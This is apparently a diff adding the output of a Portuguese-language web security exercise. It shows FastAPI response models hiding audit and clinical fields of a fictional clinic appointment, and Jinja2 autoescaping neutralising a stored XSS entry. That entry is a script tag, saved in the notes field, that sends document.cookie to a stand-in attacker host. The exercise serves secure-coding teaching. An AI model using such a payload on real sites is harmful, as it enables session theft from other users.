@@ -1,0 +1,98 @@
+====================================================================================================
+EXERCÍCIO 2 - Response models e template seguro
+====================================================================================================
+
+Registro completo no banco (o que a tabela guarda):
+{
+  "inicio": "2026-10-03 09:00:00",
+  "id": 1,
+  "status": "agendada",
+  "observacoes": "Trazer exames anteriores",
+  "criado_por_id": 3,
+  "atualizado_em": "2026-10-04 00:28:41.575808+00:00",
+  "profissional_id": 1,
+  "duracao_minutos": 30,
+  "paciente_id": 1,
+  "motivo": "Dor no peito ao esforço, avaliar ECG",
+  "token_auditoria": "aud_ecbf21da06d7d395",
+  "criado_em": "2026-10-04 00:28:41.575768+00:00",
+  "ip_origem": "127.0.0.1"
+}
+
+O mesmo registro pela API: response_model=ConsultaPublic corta token_auditoria, criado_por_id, criado_em, atualizado_em e ip_origem.
+
+> GET /consultas/1
+> Authorization: Bearer <token Dra. Helena>
+< HTTP 200
+{
+  "id": 1,
+  "paciente_id": 1,
+  "paciente_nome": "João Batista",
+  "profissional_id": 1,
+  "profissional_nome": "Dra. Helena Prado",
+  "inicio": "2026-10-03T09:00:00",
+  "duracao_minutos": 30,
+  "status": "agendada",
+  "motivo": "Dor no peito ao esforço, avaliar ECG",
+  "observacoes": "Trazer exames anteriores"
+}
+
+Agenda JSON da recepção: response_model=ConsultaAgenda também omite o motivo clínico.
+
+> GET /consultas/agenda
+> Authorization: Bearer <token Recepção>
+< HTTP 200
+[
+  {
+    "id": 1,
+    "inicio": "2026-10-03T09:00:00",
+    "duracao_minutos": 30,
+    "paciente_nome": "João Batista",
+    "profissional_nome": "Dra. Helena Prado",
+    "especialidade": "cardiologia",
+    "status": "agendada",
+    "observacoes": "Trazer exames anteriores"
+  },
+  {
+    "id": 2,
+    "inicio": "2026-10-03T10:00:00",
+    "duracao_minutos": 30,
+    "paciente_nome": "Maria Fernandes",
+    "profissional_nome": "Dr. Marcos Teixeira",
+    "especialidade": "dermatologia",
+    "status": "agendada",
+    "observacoes": "Paciente prefere contato por e-mail"
+  },
+  {
+    "id": 3,
+    "inicio": "2026-10-03T14:00:00",
+    "duracao_minutos": 30,
+    "paciente_nome": "Pedro Albuquerque",
+    "profissional_nome": "Dra. Helena Prado",
+    "especialidade": "cardiologia",
+    "status": "agendada",
+    "observacoes": ""
+  }
+]
+
+Profissional grava um comentário malicioso no campo observacoes (aceito como texto):
+
+> PUT /consultas/1
+> Authorization: Bearer <token Dra. Helena>
+> corpo (json): {"inicio": "2026-10-04T09:00:00", "duracao_minutos": 30, "status": "agendada", "motivo": "Dor no peito ao esforço, avaliar ECG", "observacoes": "<script>fetch('https://atacante.exemplo/?c='+document.cookie)</script>"}
+< HTTP 200
+{
+  "id": 1,
+  "paciente_id": 1,
+  "paciente_nome": "João Batista",
+  "profissional_id": 1,
+  "profissional_nome": "Dra. Helena Prado",
+  "inicio": "2026-10-04T09:00:00",
+  "duracao_minutos": 30,
+  "status": "agendada",
+  "motivo": "Dor no peito ao esforço, avaliar ECG",
+  "observacoes": "<script>fetch('https://atacante.exemplo/?c='+document.cookie)</script>"
+}
+
+Trecho da página /web/agenda renderizada pelo Jinja2 (autoescape ligado):
+<td>&lt;script&gt;fetch(&#39;https://atacante.exemplo/?c=&#39;+document.cookie)&lt;/script&gt;</td>
